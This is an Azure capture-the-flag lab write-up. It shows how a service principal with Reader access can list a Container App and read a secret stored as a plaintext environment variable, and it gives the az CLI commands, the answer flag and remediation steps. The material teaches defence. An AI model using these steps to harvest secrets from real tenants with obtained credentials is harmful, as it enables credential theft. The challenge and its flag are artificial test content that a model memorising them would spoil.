# Container App Env Vars — Secrets in Environment Variables

**Provider**: Azure  
**Difficulty**: Beginner  
**MITRE ATT&CK**: [T1552.007 — Container API](https://attack.mitre.org/techniques/T1552/007/)

## Scenario

You have obtained credentials for an Azure service principal with Reader access on a resource group. The resource group contains an Azure Container App. A developer has stored a sensitive value directly in the container's environment variables, which are visible in the resource definition.

## Objective

Read the Container App definition to find the flag stored in an environment variable.

## Permissions

The attacker service principal has:

- `Reader` on the resource group (built-in role)

## Attack Path

1. Authenticate with the provided service principal credentials:
   ```bash
   az login --service-principal \
     --username <client-id> \
     --password <client-secret> \
     --tenant <tenant-id>
   ```
2. List Container Apps in the resource group:
   ```bash
   az containerapp list --resource-group <resource-group> --query "[].name" -o tsv
   ```
3. Read the environment variables from the Container App definition:
   ```bash
   az containerapp show \
     --name <app-name> \
     --resource-group <resource-group> \
     --query "properties.template.containers[0].env"
   ```
4. The `SECRET_FLAG` environment variable contains the flag.

## Flag

`CUMULONIMBUS{C0nt41n3r_App_Env_V4rs_3xp0s3d}`

## Remediation

- Never store secrets directly in Container App environment variables — these are visible in the ARM resource definition to anyone with Reader access.
- Use Azure Container Apps secrets (`az containerapp secret set`) combined with `secretRef` environment variable references — secret values are not returned in read operations.
- For highly sensitive secrets, reference Azure Key Vault secrets via managed identity.
- Audit Container App definitions for plaintext secrets using Azure Policy or Defender for Cloud.
